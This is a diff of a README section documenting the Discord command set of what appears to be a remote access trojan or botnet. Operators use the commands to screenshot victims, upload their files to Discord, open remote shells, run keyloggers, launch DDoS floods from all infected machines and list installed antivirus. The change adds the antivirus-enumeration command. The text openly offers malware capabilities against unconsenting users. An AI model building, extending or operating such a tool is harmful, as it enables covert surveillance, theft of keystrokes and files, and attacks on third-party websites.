@@ -27,13 +27,18 @@ Note: Prefix can be customised
 ```
 get : Get username, machine name and screenshot of all infected machines.
 getfile {machine_name} {file_path} : Upload file located in {file_path} on specified machine to Discord.
-shell {machine_name} : Start remote shell on specified machine. Reply to the response message to input commands.
 ipinfo {machine_name} : Get IP address and geolocation of specified machine.
+
+shell {machine_name} : Start remote shell on specified machine. Reply to the response message to input commands.
+
 startkeylogger {machine_name} : Start keylogger on specified machine.
 stopkeylogger {machine_name} : Stop keylogger on specified machine.
 getkeylog {machine_name} : Get logged keys on specified machine.
+
 startddos {website_url} : Make all infected machines send GET requests to specified URL.
 stopddos : Make all infected machines stop sending GET requests.
+
+getav {machine_name} : Get all antivirus products installed on specified machine.
 uninfect {machine_name} : Uninfect specified machine.
 ```
 
